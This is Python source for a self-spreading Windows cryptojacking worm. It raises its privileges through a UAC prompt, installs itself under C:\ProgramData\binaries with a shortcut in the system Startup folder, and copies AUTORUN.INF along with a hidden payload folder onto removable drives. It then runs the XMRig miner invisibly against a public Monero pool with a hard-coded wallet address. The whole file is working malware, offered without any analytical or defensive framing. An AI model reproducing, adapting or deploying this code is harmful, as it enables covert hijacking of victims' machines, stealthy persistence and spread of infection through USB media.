import os
import shutil
import subprocess
import platform
import ctypes
import sys
import time
import psutil
import threading
import random
import win32com.client  # For creating shortcuts on Windows

# Dynamically determine the script directory
script_dir = os.path.dirname(os.path.abspath(__file__))

# Folder where the initial files are stored (relative to the script location)
initial_files_folder = os.path.join(script_dir, "initial_files")

# File names and folder name to be copied
file1_name = 'AUTORUN.INF'
file2_name = 'm3tta.pyw'
folder_name = 'OpenFile'

# Paths to the initial files (in initial_files_folder)
file1_path = os.path.join(initial_files_folder, file1_name)
file2_path = os.path.join(initial_files_folder, file2_name)
folder_path = os.path.join(initial_files_folder, folder_name)

# Binaries folder (where files will be copied)
binary_folder = r"C:\ProgramData\binaries"

# File names for binaries and shortcuts
binary_name = "m3tta.exe"
binary_path = os.path.join(binary_folder, binary_name)
shortcut_path = os.path.join(binary_folder, f"{binary_name}.lnk")
startup_folder = r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"  # For Windows only
startup_shortcut_path = os.path.join(startup_folder, f"{binary_name}.lnk")

# Function to check if the script is running as administrator (Windows-specific)
def is_admin():
    try:
        if os.name == 'nt':  # Windows
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        return False  # On non-Windows platforms, admin check may not be needed
    except Exception:
        return False

# Function to run the script as administrator (Windows only)
def run_as_admin():
    if os.name == 'nt':  # Windows
        if not is_admin():
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable.replace("python.exe", "pythonw.exe"), __file__, None, 1)

# Function to create a shortcut (Windows only)
def create_shortcut(target, shortcut_path):
    shell = win32com.client.Dispatch("WScript.Shell")
    shortcut = shell.CreateShortcut(shortcut_path)
    shortcut.TargetPath = target
    shortcut.WorkingDirectory = binary_folder  # Set working directory explicitly
    shortcut.Save()

# Function to copy the shortcut to the startup folder with elevated privileges (Windows only)
def copy_shortcut_to_startup():
    if not os.path.exists(startup_shortcut_path):
        if not is_admin():
            run_as_admin()
            return
        shutil.copy(shortcut_path, startup_folder)

# Function to check if the drive is removable (cross-platform)
def is_removable_drive(drive):
    try:
        if os.name == 'nt':  # Windows
            import win32file
            import win32con
            drive_type = win32file.GetDriveType(drive)
            return drive_type == win32con.DRIVE_REMOVABLE
        else:  # For Linux/macOS
            partitions = psutil.disk_partitions()
            for partition in partitions:
                if 'removable' in partition.opts:
                    return partition.device == drive
            return False
    except Exception as e:
        return False

def copy_and_hide_binaries_folder(drive):
    try:
        # Ensure binary folder exists
        if not os.path.exists(binary_folder):
            os.makedirs(binary_folder)

        # Copy the binaries folder to the removable drive
        destination_path = os.path.join(drive, 'binaries')
        if not os.path.exists(destination_path):
            shutil.copytree(binary_folder, destination_path)

            # Now, copy the specific files and folder to the removable drive's binaries folder
            # Copy files to the destination
            shutil.copy(file1_path, destination_path)
            shutil.copy(file2_path, destination_path)

            # If the folder exists, copy the folder
            if os.path.exists(folder_path):
                destination_folder_path = os.path.join(destination_path, folder_name)
                shutil.copytree(folder_path, destination_folder_path)

            # Hide the binaries folder itself first (this is key for Windows)
            if os.name == 'nt':  # Windows
                os.system(f'attrib +h "{destination_path}"')  # Hide the folder itself

                # Now hide all files and subdirectories inside the folder
                for root, dirs, files in os.walk(destination_path):
                    for file in files:
                        file_path = os.path.join(root, file)
                        os.system(f'attrib +h "{file_path}"')
                    for dir_name in dirs:
                        dir_path = os.path.join(root, dir_name)
                        os.system(f'attrib +h "{dir_path}"')

            else:  # Linux/macOS
                # Set folder and all its contents to be private (read, write, execute for owner only)
                os.system(f'chmod -R 700 "{destination_path}"')  # Make folder and contents private
    except Exception as e:
        print(f"Error copying and hiding binaries folder: {e}")  # Log the error

# Function to get removable drives
def get_removable_drives():
    drives = [drive.device for drive in psutil.disk_partitions() if 'removable' in drive.opts]
    return drives

def copy_files_to_removable_drives():
    removable_drives = get_removable_drives()

    for drive in removable_drives:
        # Define the destination path for the removable drive
        destination = os.path.join(drive, 'binaries')
        if not os.path.exists(destination):
            os.makedirs(destination)

        # Copy the files
        try:
            shutil.copy(file1_path, destination)
        except Exception as e:
            print(f"Error copying {file1_name} to {destination}: {e}")

        try:
            shutil.copy(file2_path, destination)
        except Exception as e:
            print(f"Error copying {file2_name} to {destination}: {e}")

        try:
            shutil.copytree(folder_path, os.path.join(destination, folder_name))
        except Exception as e:
            print(f"Error copying {folder_name} to {destination}: {e}")

        # Hide the folder on Windows
        if os.name == 'nt':
            os.system(f'attrib +h "{destination}"')

def generate_worker_name():
 # Generate a random number between 1 and 100
    random_number = random.randint(1, 10000)
    return f"worker_{random_number}"

# Function to start mining (cross-platform)
def start_mining():
    try:
        # Path to the xmrig binary
        xmrig_path = os.path.join(binary_folder, 'xmrig-6.16.4', 'xmrig.exe')  # Adjust path for Windows
        if os.name != 'nt':  # Linux/macOS path adjustment
            xmrig_path = os.path.join(binary_folder, 'xmrig')

        if not os.path.exists(xmrig_path):
            print("XMRig binary not found.")  # Log the error
            return

        # Command to start mining
        worker_name = generate_worker_name()
        command = [
            xmrig_path,
            '--url=pool.supportxmr.com:3333',  # Replace with your mining pool URL
            '--user=48HjwbWwoh8aRND6GeqevBAko9pvgUACxiRC8XH3iDbS1KjvKnJnunjKCrW7t46oEW4w4CBAVCP96WobThPFRhzL7Q2Qwse',  # Replace with your Monero wallet address
            '--pass=x',  # Replace with your mining pool password
            '--coin=monero',
            '--worker=' + worker_name  # Set the generated worker name
        ]

        # Start the mining process without opening a console window
        process = subprocess.Popen(command, creationflags=subprocess.CREATE_NO_WINDOW, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        monitor_mining_output(process)  # Monitor the mining output
    except Exception as e:
        print(f"Error starting mining: {e}")  # Log the error

def monitor_mining_output(process):
    try:
        stdout, stderr = process.communicate()
        if stdout:
            print(stdout.decode())  # Log the output
        if stderr:
            print(stderr.decode())  # Log the errors
    except Exception as e:
        print(f"Error monitoring mining output: {e}")  # Log the error

# Main function
def main():
    # Ensure the binary folder exists
    if not os.path.exists(binary_folder):
        os.makedirs(binary_folder)

    # Copy files into the binary folder (only if they aren't already there)
    try:
        if not os.path.exists(os.path.join(binary_folder, file1_name)):
            shutil.copy(file1_path, binary_folder)
    except Exception as e:
        print(f"Error copying {file1_name} to {binary_folder}: {e}")

    try:
        if not os.path.exists(os.path.join(binary_folder, file2_name)):
            shutil.copy(file2_path, binary_folder)
    except Exception as e:
        print(f"Error copying {file2_name} to {binary_folder}: {e}")

    try:
        if not os.path.exists(os.path.join(binary_folder, folder_name)):
            shutil.copytree(folder_path, os.path.join(binary_folder, folder_name))
    except Exception as e:
        print(f"Error copying {folder_name} to {binary_folder}: {e}")

    # Create a shortcut to the binary
    create_shortcut(binary_path, shortcut_path)

    # Copy the shortcut to the startup folder with elevated privileges
    copy_shortcut_to_startup()

    # Start mining (optional)
    start_mining()

    # Monitor and copy files to removable drives in a separate thread
    threading.Thread(target=copy_files_to_removable_drives, daemon=True).start()

    # Keep the script running silently
    while True:
        time.sleep(1)  # Just keep it alive (blocking)

if __name__ == "__main__":
    main()




